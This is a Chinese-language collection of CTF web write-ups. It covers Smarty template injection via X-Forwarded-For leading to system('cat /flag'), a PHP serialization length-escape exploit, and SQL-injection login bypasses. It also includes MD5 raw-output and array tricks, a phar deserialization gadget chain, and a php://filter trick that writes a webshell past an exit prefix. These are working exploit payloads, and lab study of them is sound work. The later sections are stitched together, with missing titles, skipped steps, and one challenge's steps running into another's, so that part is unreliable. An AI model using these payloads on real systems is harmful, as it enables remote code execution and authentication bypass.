    [BJDCTF2020] The mystery of ip — 认错引擎的一半时间

    题目类型：Web — SSTI（Smarty / PHP）

    题目地址：BUUCTF / ctf2 复刻环境

    Flag：CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}

    题目概述

    进入靶场只有两个链接：flag 和 hint。

    hint 里没放东西。打开 flag，页面输出：

    Your IP is : 10.42.1.78

    问题来了：它怎么知道我的 IP 的？

    解题过程

    Step 1：既然它读 IP，那就伪造 IP

    服务器判断"你的 IP"，通常看 X-Forwarded-For 这类头（反向代理会加）。所以先手动改一个试试：

    curl.exe -k -H "X-Forwarded-For: TESTIP_9.9.9.9" "https://…:9999/flag.php"

    页面真的跟着变了 —— 说明这个头被原样拿来用。

    （这道题的平台给的是裸 TCP 地址，但它其实是个 HTTPS 服务，所以我直接用 https://host:9999/ 访问，不需要 nc / openssl。）

    Step 2：改完还能正常输出，那就试模板注入

    先上最基础的探针：

    X-Forwarded-For: {{7*7}}      →  49

    模板被执行了。但这一刻不要急着下结论。

    Step 3：{{7*'7'}} 才是分水岭

    X-Forwarded-For: {{7*'7'}}    →  49

    这个结果说明引擎把 '7' 当成数字处理了 —— 那是 PHP 系模板的行为。

    引擎 7*'7' 的结果
    Jinja2（Python） 7777777（字符串重复）
    Smarty / Twig（PHP） 49（转成数字相乘）

    所以这不是 Jinja2。看报错也印证了：

    Uncaught --> Smarty Compiler: Syntax error in template …
thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php

    sysplugins/smarty_internal_* 就是 Smarty 的源码目录。

    这一步我走了弯路：一开始按题名以为是 Flask 版，直接套 __class__ 那条链，结果报错说 Smarty 语法不对。只测 {{7*7}} 是不够的 —— Jinja 和 Smarty 都回 49。

    Step 4：确认 Smarty 版本

    X-Forwarded-For: {$smarty.version}


    Your IP is : 3.1.34-dev-7

    Smarty 3.1。这意味着 Smarty 2 时代的 {php}…{/php} 标签已经被移除了，那条路走不通。

    Step 5：Smarty 3 的路子是 {if}

    Smarty 的 {if} 表达式最终会被编译成 PHP 的 if (...)，而表达式里的函数调用会被原样写进编译结果。

    // {if phpinfo()}{/if}  编译后大致是：
if (phpinfo()) { }

    所以先验证这条路通不通：

    X-Forwarded-For: {if phpinfo()}{/if}

    成功返回了 phpinfo 页面。

    Step 6：先看环境，再读文件

    phpinfo 里翻两件事：

    disable_functions   →  空        （system / exec 都没禁）
open_basedir        →  没设      （没有被限制目录）

    顺手看了环境变量，只有一个 FLAG=not_flag：

    这是干扰项，别信。

    Step 7：执行命令

    注意 {if} 只判断真假，不打印值。所以要挑"自己会 echo 出来"的函数。system 属于这类。

    X-Forwarded-For: {if system('ls /')}{/if}

    根目录下有个 flag。

    Step 8：读出来

    X-Forwarded-For: {if system('cat /flag')}{/if}

    CTF2{96ccbb12-bfb7-4d63-82a5-9424b108d493}

    解题思路总结

    页面显示 "Your IP is" → 改 X-Forwarded-For 验证伪造
  → 改完还正常输出 → 试 {{7*7}} 得 49 → 模板被执行
    → {{7*'7'}} 也回 49 → 不是 Jinja2，是 PHP 系（Smarty）
      → 报错里的 smarty_internal_*.php 印证
        → {$smarty.version} 得 3.1.34 → {php} 标签已移除
          → {if phpinfo()}{/if} 成功 → {if} 里能调 PHP 函数
            → 看 disable_functions / open_basedir → 都没限制
              → {if system('ls /')}{/if} 看到 /flag
                → {if system('cat /flag')}{/if} 拿到 flag

    漏洞原理

    ① 输入来源不只是参数，还有请求头

    X-Forwarded-For 是代理用来传递客户端 IP 的头。如果应用直接信任它、又把它拼进模板，那就同时拿到"注入点"和"可伪造的输入"。

    ② 模板引擎把"表达式"编译成代码

    Smarty 把 {if 表达式} 编译成 PHP 的 if (表达式)。只要表达式里允许出现函数调用，就等于允许执行 PHP 函数。这和 Jinja 的 {{ }} 能访问对象属性是同一类问题的不同表现。

    ③ {if} 只判真假，不打印值

    if (phpinfo()) { }                    // phpinfo 自己会输出 → 能看到
if (file_get_contents('/flag')) { }   // 只返回字符串 → 页面空白

    所以要选"会输出"的函数（phpinfo、system、readfile、print），或者把返回值再套一层输出函数。

    关键知识点

    知识点 说明
    X-Forwarded-For 伪造客户端 IP；应用信任它就是注入点
    {{7*7}} 只证明"模板被执行"，不能分辨引擎
    {{7*'7'}} Jinja2 → 7777777；PHP 系 → 49
    Smarty 语法 {标签} / {$变量} / {$var\|修饰符}，没有对象属性访问
    {$smarty.version} Smarty 内置变量，看版本
    Smarty 2 vs 3 {php}…{/php} 在 3.x 已移除
    {if 函数()}{/if} Smarty 3 里调用 PHP 函数的入口
    disable_functions / open_basedir 决定拿到函数调用之后能走多远
    环境变量里的 FLAG=not_flag 干扰项，别信
    这题踩的两个坑

    ① 认错引擎

    只测了 {{7*7}} 回 49 就往 Jinja2 的 __class__ 链上走，报错才发现是 Smarty。

    教训：{{7*7}} 只证明"模板在执行"，{{7*'7'}} 才区分引擎。

    ② 中文引号

    手打 payload 时输入法给了 ‘’（U+2018/U+2019），Jinja/Smarty 都不认，报 unexpected char。

    打模板时把输入法切英文；报错里连位置都给了（at 2），照着看就行。

    [0CTF 2016] piapiapia — 序列化长度逃逸（where → hacker）

    题目类型：Web — 源码泄露 + PHP 反序列化长度逃逸

    题目地址：0CTF 2016 piapiapia（原题环境已关闭）

    Flag：CTF2{53ec6fc8-d499-4f76-bed2-6c4c2a076b43}

    题目概述

    进入靶场是一个登录页面，没什么有用信息，也没找到注册页面。

    但这题的入口不是页面，是源码。

    解题过程

    Step 1：dirsearch 扫出 www.zip

    先试着用 dirsearch 扫一下，结果发现了 www.zip —— 里面放着各个界面的源码。

    把这几个文件读一遍：config.php、profile.php、update.php、class.php、register.php。

    Step 2：config.php 里有 flag

    所以问题变成：从哪里能读到 config.php。

    Step 3：profile.php 里有个任意文件读取

    $profile = unserialize($profile);
$phone   = $profile['phone'];
$email   = $profile['email'];
$nickname = $profile['nickname'];
$photo   = base64_encode(file_get_contents($profile['photo']));

    看到 file_get_contents($profile['photo']) 这一串，就想到：把 photo 换成 config.php，flag 不就出来了吗？

    但 $profile 是 unserialize() 出来的 —— 也就是说，photo 的值来自我们存在数据库里的那个序列化串，不是我们能直接改的。所以问题变成：怎么让数据库里那个串里的 photo 变成 config.php。

    Step 4：update.php 的三道校验

    if(!preg_match('/^\d{11}$/', $_POST['phone']))
    die('Invalid phone');

    die('Invalid email');

if(preg_match('/^[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
    die('Invalid nickname');

$file = $_FILES['photo'];
if($file['size'] < 5 or $file['size'] > 1000000)
    die('Photo size error');

    三个字段各有各的规矩：

    字段 限制
    phone 11 位纯数字
    email xxx@xxx.xxx，每段 ≤10 的字母数字
    nickname 首字符必须是字母数字下划线，且长度 ≤10
    photo 文件大小 5 ~ 1000000 字节

    这里还没想到哪里能字符逃逸，先往下看它怎么存。

    Step 5：存的时候做了序列化，而且会过滤

    $user->update_profile($username, serialize($profile));

    接着去看 class.php 里的 update_profile：

    public function update_profile($username, $new_profile) {
    $username = parent::filter($username);
    $new_profile = parent::filter($new_profile);
    ...
}

    注意：过滤发生在序列化之后** —— 它拿到的是序列化后的字符串。**

    Step 6：filter() 里的长度差

    public function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}

    关键在最后一行：

    select → hacker   6 → 6   不变
insert → hacker   6 → 6   不变
update → hacker   6 → 6   不变
delete → hacker   6 → 6   不变
where  → hacker   5 → 6   多出 1 个字节   ⭐

    **where 只有 5 个字符，却被换成了 6 个字符的 hacker —— 每出现一次，字符串就长 1 个字节，而前面 s:N: 里的 N 不变。

    这就是字符逃逸：声明长度不变，实际内容变长。

    Step 7：nickname[] 同时绕过两个检查

    nickname 有两条限制：字符集和长度。

    发 nickname[]=xxx 时，$_POST['nickname'] 是一个数组：

    strlen(array)      →  NULL（PHP 7 报 warning，返回 null）
                      NULL > 10 为 false → 长度检查放过

preg_match(..., array) →  false（PHP 7 报 warning）
                      false || false = false → 不 die

    所以两条检查都被跳过了 —— 这意味着元素内容里可以出现 "、;、{、} 这些字符，这是后面构造注入串的前提。

    ⚠️ 这是 PHP 7 的行为。PHP 8 里 strlen(array) 会抛 TypeError（致命错误），这条路直接 500。

    Step 8：构造 payload

    目标是让反序列化后的 photo 变成 config.php。

    先说对齐的规则：

    设：片段长度 F，where 的个数 k

nickname 元素的声明长度 = 5k + F      （过滤前算的）
过滤后的实际字节       = 6k + F

要让解析器读完声明长度后，正好停在片段开头的引号上：

        6k = 5k + F   →   k = F

    我们的片段：

    ";}s:5:"photo";s:10:"config.php";}

    长度用 strlen 数是 34（别手数）→ 所以要 34 个 where。

    然后看这个片段在干什么：

    s:204:"hacker×34         ← 声明 204，实际 238；解析器只读 204
       ";                ← 读完 204 正好停在这里 → 字符串正常结束
         }               ← 关闭内层数组 a:1:{i:0;...}
          s:5:"photo";s:10:"config.php";}   ← 注入 photo，并关闭外层数组

    外层数组一关，后面原来那句 s:5:"photo";s:5:"x.jpg";} 就被 unserialize 忽略了 —— 所以 nickname 必须排在 photo 前面，否则注入的结构关不掉外层，解析照样失败。

    用 PHP 7.4 模拟验证（k=34 且 nickname 在第三位）：

    nickname 第三  k=34  N=204  过滤后=238  photo=config.php  ✅
nickname 最后  k=34                       失败
k=33 / k=35                               失败

    Step 9：发包、解码、拿 flag

    注册登录 → 进 update 页面 → 文件随便传一个 5~1000000 字节的 → 抓包，把 nickname 改成：

    name="nickname[]"

wherewhere……（34 个）……";}s:5:"photo";s:10:"config.php";}

    发包后访问 profile.php：

    photo 已经被读成 config.php，内容是 base64 的图片 data:image/gif;base64,...，解码 ——

    CTF2{53ec6fc8-d499-4f76-bed2-6c4c2a076b43}

    解题思路总结

    页面没线索 → dirsearch 扫出 www.zip
  → 源码里：config.php 有 flag，profile.php 有 file_get_contents($profile['photo'])
    → photo 来自 unserialize → 需要一个「photo=config.php」的序列化串
      → update.php 存的时候是 serialize() 之后再 filter()
        → filter 里 where(5) → hacker(6)，每处多 1 字节
          → 长度逃逸：N 不变、内容变长 → 多出来的字节被当成结构
            → nickname[] 绕过字符集和长度检查（PHP 7 的 strlen/preg_match 行为）
              → 34 个 where + 34 字节片段 → photo 被改写成 config.php
                → profile.php 读出来 → base64 解码 → flag

    漏洞原理

    ① 过滤发生在序列化之后

    序列化时把每个值的长度写死在 s:N: 里；过滤时又把内容改长了。写死的长度和实际内容对不上，解析器就会按旧的偏移去读 —— 多出来的那部分被当成新的结构。**

    ② 长度差的方向决定利用方式

    变长（where→hacker，+1）：声明短于实际 → 读完 N 字节后，多出的部分被重新解析
变短（若存在）：          声明长于实际 → 值会吞掉后面的结构

    这题是前者。

    ③ 类型混淆绕过检查

    校验函数假设 $_POST['nickname'] 是字符串，但传数组进去：strlen() 返回 null、preg_match() 返回 false —— 两个检查都不成立。

    这类"检查的是 A 类型，用的是 B 类型"的洞，在 PHP 里很常见（str_replace 收数组、in_array 弱比较都是同一类）。

    关键知识点

    知识点 说明
    s:N:"..." 序列化时写死的长度；改动内容而不改 N 就会错位
    长度逃逸 过滤前后长度差，被用来"挤出"结构
    where → hacker 唯一"变长"的替换：5 → 6，每处 +1 字节
    对齐条件 k = 片段长度（因为 6k = 5k + F）
    片段的 } 前一个 } 关内层数组，后一个 } 关外层数组，让后面的原始内容被忽略
    字段顺序 注入的结构必须落在目标字段之前
    nickname[] 数组绕过：strlen(array)=NULL、preg_match(array)=false（PHP 7）
    PHP 8 差异 同样两行在 PHP 8 会抛 TypeError，数组绕过失效
    www.zip CTF 里最常见的源码泄露入口之一
    class.php 的 filter() 与相关方法（按截图整理）

    ctfshow web10 — 用 WITH ROLLUP 造一个 NULL 密码

    题目类型：Web — SQL 注入（黑名单 + 长度校验）

    题目地址：ctfshow 入门 Web10

    Flag：ctfshow{fe48aa87-a2ba-4293-a096-5812a866ae77}

    题目概述

    一个登录框。登录按钮旁边有个「取消」，点它直接把源码下载下来了。

    拿到源码之后，这题就变成了一道「读代码」的题。

    解题过程

    Step 1：源码先给全了

    function replaceSpecialChar($strParam){
    $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
    return preg_replace($regex, "", $strParam);
}

if (strlen($username) != strlen(replaceSpecialChar($username))) {
    die("sql inject error");
}
if (strlen($password) != strlen(replaceSpecialChar($password))) {
    die("sql inject error");
}

$sql = "select * from user where username = '$username'";
$result = mysqli_query($con, $sql);
if (mysqli_num_rows($result) > 0) {
    while ($row = mysqli_fetch_assoc($result)) {
        if ($password == $row['password']) {
            echo "登陆成功<br>";
            echo $flag;
        }
    }
}

    Step 2：这道题有两条互相配合的防线

    ① 黑名单是「替换为空」，删掉：

    select  from  where  join  sleep  and  \s（所有空白）  union  ,

    ② 更狠的是第二道：删完还要比长度

    strlen($username) != strlen(replaceSpecialChar($username))  →  直接 die

    这意味着：你的输入里一个被黑名单命中的子串都不能有** —— 只要有一个字符被删掉，长度就对不上，直接报 sql inject error。**

    所以「双写绕过」在这题是完全无效的：

    seleselectct   →  删掉中间的 select 后变短 → 长度不等 → die

    Step 3：但 password 根本没进 SQL

    看这一行：

    $sql = "select * from user where username = '$username'";   // 只有 username

    password 不拼 SQL。它是在 PHP 里做松散比较：

    if ($password == $row['password'])

    所以思路要拆成两步：

    ① username 注入  →  让查询返回一行
② 那一行的 password  →  和我发过去的 password 用 == 相等

    Step 4：把 password 变成 NULL

    如果查询能返回一行「password 是 NULL」，那我们要发的 password 就是空：

    '' == NULL   →   true      // PHP 7 的松散比较

    怎么让查询返回 NULL？用 WITH ROLLUP。

    Step 5：WITH ROLLUP 是什么

    它是 GROUP BY 的修饰符，用来多产出一行汇总行：

    select * from user group by password with rollup;

    password
e10adc3949ba59abbe56e057f20f883e
5f4dcc3b5aa765d61d8327deb882cf99
NULL                              ← 汇总行

    规则：汇总行里，被 GROUP BY 的那一列会变成 NULL。

    所以这里必须 group by password，不能 group by username：

    group by username with rollup
     → 汇总行: username=NULL，password=某一行的真实值   ✗ 拿到的还是哈希

group by password with rollup
     → 汇总行: password=NULL，username=某一行的值       ✓ 正是我们要的

    因为 SELECT * 取所有列，没被分组的列在汇总行里取的是组内某一行的值 —— 只有被分组的那列才是 NULL。

    Step 6：为什么还需要 or 1=1

    WITH ROLLUP 的汇总行是「在分组结果之上再加一行」，它需要先有分组。

    where username = 'admin' group by password with rollup

    如果 admin 这个用户不存在（或者你不确定它在不在），WHERE 一行都匹配不到 → 没有分组 → 也就没有汇总行 → 拿不到 NULL。

    加上 or 1=1：

    where username = 'admin' or 1=1 group by password with rollup

    WHERE 恒真 → 表里所有行都进来 → 必有分组 → 汇总行必然出现。

    一句话：or 1=1 让整条链不依赖具体用户名是否存在。

    Step 7：空格被过滤，用 /**/

    \s 在黑名单里 —— 空格、Tab、换行全被删。

    admin'or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#

    题目类型：Web — MD5 特性 / 弱类型 / SQL 注入

    Flag：CTF2{028c2bd1-33f7-401b-b299-1525fd86cf41}

    题目概述

    刚进来就是一个查询页面，一个输入框加一个「提交查询」按钮，源码里什么也没有。

    后面还有两关，一共三层，每层考一种不同的绕过。

    解题过程

    Step 1：先是完全没头绪

    看着像查询框，先试各种 SQL 注入 —— 页面一点动静都没有。

    又用 dirsearch 扫了一下，还是没东西。

    最后抓包发出去，看响应头，发现了 hint。

    Step 2：Hint 在响应头里

    Hint: select * from 'admin' where password=md5($pass, true)

    注意 md5($pass, **true**) 这个第二个参数。

    md5($s, false)  →  32 位十六进制字符串（平时用的那种）
md5($s, true)   →  16 字节的原始二进制

    平时我们见到的 md5 结果都是 32 个字符，那是因为默认把它编码成十六进制了。true 返回的是原始字节** —— 而这些字节里可以出现引号、反斜杠等特殊字符。**

    SQL 拼出来是：

    select * from 'admin' where password='<md5 的原始字节>'

    如果 md5 的原始字节以 'or' 开头，就变成了：

    where password=''or'6...'
                └──┘ └──── 非空字符串 → 真

    '' or '任意非空字符串' 恒为真 → 直接登录进去。

    本机验证：

    md5('ffifdyop', true)
= 276f722736c95d99e921722cf9ed621c
可打印形式： 'or'6.]..!r,..b.

    所以第一关的答案就是 ffifdyop。

    Step 4：第二关 —— 松散不等 + 弱相等

    $a != $b          松散不等（数组、'1' 和 1 都算相等）

    ① 0e 碰撞

    ?a[]=1&b[]=2

    Step 5：第三关 —— 严格不等 + 强相等

    if ($_POST['param1'] !== $_POST['param2'] && md5($_POST['param1']) === md5($_POST['param2'])) {
    echo $flag;

    !== 和 === 都不做类型转换 —— 这才是关键。

    0e 那条路断了：字符串 === 比较要求完全相同。

    但数组还能用：

    param1[]=1&param2[]=2
    表达式 结果 原因
    param1 !== param2 true 两个数组元素不同
    md5(param1) === md5(param2) true 两边都是 NULL，NULL === NULL

    但问题来了：整个站里没有 unserialize()，怎么让它执行？

    Step 5：没有 unserialize()，还有 phar

    这就是 phar 反序列化：

    有序列化数据必然会有反序列化操作。php 大部分的文件系统函数在通过 phar:// 协议解析 phar 文件时，都会对 meta-data 进行反序列化。

    换句话说：你不需要有 unserialize() 这个函数，只要有任何一个文件系统函数被传入了 phar:// 开头的路径，meta-data 里的对象就会被反序列化。

    可以触发的函数有一大张表：file_exists、file_get_contents、unlink、stat、readfile、copy……

    Step 6：download.php 不行，delete.php 行

    先看 download.php：

    if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {
    ...
    echo $file->close();
}

    它确实会调用 close()，但那个 stristr($filename, "flag") === false 把带 flag 的路径全过滤了 —— 走不通。

    再看 delete.php：

    public function detele() {
    unlink($this->filename);
}

    unlink() 正好在受影响函数列表里 —— 只要 filename 是 phar://...，调用 unlink 的那一刻就会触发反序列化。

    （注：方法名 detele 是原题作者拼错的，不是笔误。）

    Step 7：倒推整条链

    目标是 File::close()。但它没有什么特殊的触发方式，所以要一层层往上找。

    先看 FileList::__call：

    public function __call($func, $args) {
    array_push($this->funcs, $func);
    foreach ($this->files as $file) {
        $this->results[$file->name()][$func] = $file->$func();
    }
}

    $file->$func() 这一句是动态调用 —— 如果我们让 $func = 'close'，那 $file->close() 就被执行了。

    而 __call 的触发条件是：调用了一个不存在的方法。

    再往上看，User::__destruct：

    public function __destruct() {
    $this->db->close();
}

    $this->db 是我们可以控制的属性。只要让它等于一个 FileList 对象，那么 $this->db->close() 就变成了「对 FileList 调用一个它没有的方法 close」→ 正好触发上面的 __call。

    整条链就接起来了：

    unlink(phar://...)            ← delete.php 里的 File::detele()
  ↓ 触发 phar 的 metadata 反序列化
User::__destruct()
  ↓  $this->db->close()
FileList::__call('close')
  ↓  foreach $files: $file->close()
File::close()
  ↓  file_get_contents('/flag.txt')
结果存进 $results
  ↓
FileList::__destruct()        ← 把 results 输出出来

    解题过程

    Step 1：第一关，先看四道检查在拦什么

    首先进行代码审计：

    检查 拦的是 你要满足
    !is_string($num) 数组 传字符串
    $num == 411413 直接输入答案 不能弱等于 411413
    preg_match("/[a-z\.]/i") 所有字母 + 点 不能有 e、x、b
    !strpos($num,"0") 0 在第 0 位 0 必须在后面
    intval($num,0) === 411413 —— 解析后必须等于 411413

    Step 2：确定只剩八进制

    intval($num, 0) 第二个参数为 0，那么就看 num 的开头：

    0x 开头  →  16 进制     ✗ 字母 x 被 [a-z] 拦了
0b 开头  →  2 进制      ✗ 字母 b 被拦了
0 开头   →  8 进制      ✓ 纯数字，只剩这条
其他     →  10 进制     ✗ 十进制真值会等于 411413，被第一道 `==` 拦

    所以这里只能用 8 进制。

    Step 3：但 0 不能是第一个 —— 用换行符

    八进制必须以 0 开头，可 strpos 那道又不许 0 在第 0 位。

    关键在于：intval 会跳过前导空白，而 strpos 不会跳过任何东西 —— 它只是找下标。

    strpos("01443425","0")  = 0   → !0 = true  → 死
strpos("\n01443425","0") = 1  → !1 = false → 活
intval("\n01443425", 0)  = 411413          → 值对

    所以选择用 %0A（换行符）当第一个就可以了。

    Step 4：算数字

    别手算，用 PHP 算：

    php -r "echo base_convert('411413', 10, 8);"

    得到 1443425，前面补 0 就是 01443425。

    payload：?num=%0A01443425

    ⚠️ 数字必须完整。 少一位（比如写成 0144325）intval 会得到 51413，差得非常远。

    Step 5：第二关，<?php exit;?> 是“前缀死刑”

    进来之后源码就很明晰了：

    $written = @file_put_contents(
    $filename,
    "<?php exit;?>" . $content
);

    写出来的文件是这样的：

    <?php exit;?><?php system('cat /f*');?>

    exit; 会在你的代码之前执行，整个请求立刻结束 —— 后面那段永远到不了。

    它不删你的代码，只是让你的代码排不上队。

    Step 6：要改的是 filename，不是 content

    file_put_contents 的第一个参数是文件名，而 PHP 的文件名支持流包装器。所以我能控制的不只是“写到哪”，还有“写入途中经过什么处理”：**

    php://filter/write=<滤镜>/resource=<真实路径>

    这就是这题的突破口 —— 问题不在 content 装不进去，而在写入通道可以被编程。

    Step 7：convert.base64-decode 把前缀变成乱码

    用 convert.base64-decode，数据在落盘前会先做一次 base64 解码。而 base64 解码器的规则是：

    ① 只认 [A-Za-z0-9+/=]
② 其他字符（< ? 空格 ; >）直接丢掉
③ 剩下的每 4 个字符 → 3 字节

    <?php exit;?> 里能留下的只有 phpexit —— 7 个字母：

    [<] 丢弃   [?] 丢弃   [p] 留下   [h] 留下   [p] 留下
[ ] 丢弃   [e] 留下   [x] 留下   [i] 留下   [t] 留下
[;] 丢弃   [?] 丢弃   [>] 丢弃

    留下的 7 个字母会被当成数据解码，变成 6 个乱码字节。

    最终文件变成：

    [6 字节乱码] + [我们自己的 PHP 代码]

    乱码里没有 <，所以 PHP 不会在那里进入代码模式，只是把它当普通字节输出（页面顶部那几个怪字符）；后面我们自己的 <?php 才是第一个被识别的开标签。

    Step 8：必须补字符对齐

    base64 解码要求有效字符数是 4 的倍数。

    7（phpexit）+ 补充字符数 + base64 长度  必须 % 4 == 0
7 + 1 + 32 = 40  ✅
7 + 5 + 32 = 44  ✅   加 5 个凑成 12 也行

    不足 4 的倍数，滤镜会报 invalid byte sequence，写入直接失败。

    所以要在 base64 前面补 1 个字符（或 5 个），跟前面的 7 个凑成 8（或 12）。

    Step 9：把 content= 也编码进去 —— 我踩的第一个坑

    这里我最开始不知道在干嘛，把 content= 也放进去编码了，查询时一直报错，太迷了。

    content 是字段名，必须原样出现在 body 里，不能被编码：

    content=<1 个对齐字符><只含 <?php ... ?> 的 base64>

    如果把整段 content=<?php ...?> 都编码了，PHP 解析出来的键就是那一长串 base64，$_POST['content'] 根本不存在 —— 后端第一句 isset 就 exit 了，页面一片空白。

    Step 10：尾部 = 和 + 的坑

    当时遇到一个问题：用工具编码后，结尾那个字符在表单里会被改掉，导致访问文件失败。

    原因是 base64 里有两个特殊字符：

    字符 是什么 表单里会怎样
    + 字母表第 62 号，真实数据 被当成空格，整个末尾错位
    = 填充符，不是数据 被某些工具当分隔符处理，删掉后末组不完整

    ?> 是两个字节，编成 base64 就是 Pz4= —— 结尾一定带 =。

    所以这里我就删掉了 ?>，反正单个 ; 也能确定语句的结束。

    去掉 ?> 之后，base64 结尾是 Jyk7（纯字母数字），整个值里没有任何会被表单规则特殊对待的字符。

    顺带说：PHP 文件本来就不需要 ?> 结尾，官方也建议省略 —— 这一刀砍得对。

    解题思路总结

    第一关：
  四道检查互斥
    → 字母全禁 → 只剩八进制（0x / 0b 都要字母）
      → 但 strpos 不许 0 在第 0 位
        → 用换行符占位：intval 跳过它，strpos 数它
          → 算 411413 的八进制，拼起来，进 session

第二关：
  file_put_contents 的 filename 可控 → 能挂流包装器
    → 前缀 <?php exit;?> 会先执行 → 必须毁掉它
      → convert.base64-decode：非字母表字符全丢，字母被解码成乱码
        → 7 个字母 + 补 1 个对齐 → 前缀变成 6 字节乱码
          → 文件 = 乱码 + 我们的 shell → 执行 → flag

    漏洞原理

    ① 同一个字符串，两个函数读出两种含义

    intval($num, 0)   看"值"：跳过前导空白，按第一个字符定进制
strpos($num, "0") 看"位置"：不解析，只找下标

    "\n01443425" 对前者是 411413，对后者是"0 出现在第 1 位"。两个结论都成立，检查就被夹在中间。

    ② 写入通道可编程

    file_put_contents 的文件名支持 php://filter，等于把"写文件"变成了"写文件前先过一道处理"。前缀防护在这种通道面前形同虚设。

    ③ base64 解码器只认字母表

    它不认识 PHP，不知道 <?php 意味着代码。它只会：字母表里的解码，字母表外的丢掉。所以 <?php exit;?> 不会被"删除"，而是被"翻译成 6 个字节的乱码"。

    关键知识点

    知识点 说明
    intval($s, 0) base 0 = 按前缀自动判进制：0x 十六 / 0b 二 / 0 八 / 其余十
    前导空白 intval 跳过（isspace：空格 \t \n \r），strpos 不跳过
    strpos 返回 0 0 是 falsy，所以 !strpos(...) 会把"出现在首位"和"没找到"判成同一种情况
    == vs intval 弱比较走自动转换（十进制），intval(,0) 走显式进制解析 —— 两者可以给出不同的值
    流包装器 php://filter/write=<滤镜>/resource=<路径>，写入前可编程处理
    base64 解码规则 只认 [A-Za-z0-9+/=]，其余丢弃；每 4 字符 → 3 字节
    base64 填充 = 表示最后一组没装满；删掉后严格解码器会丢掉末组
    表单编码 + 变空格、= 是分隔符 —— base64 结尾这两个字符最容易被改坏
    ?> 可省 PHP 文件末尾不需要闭合标签，官方建议省略
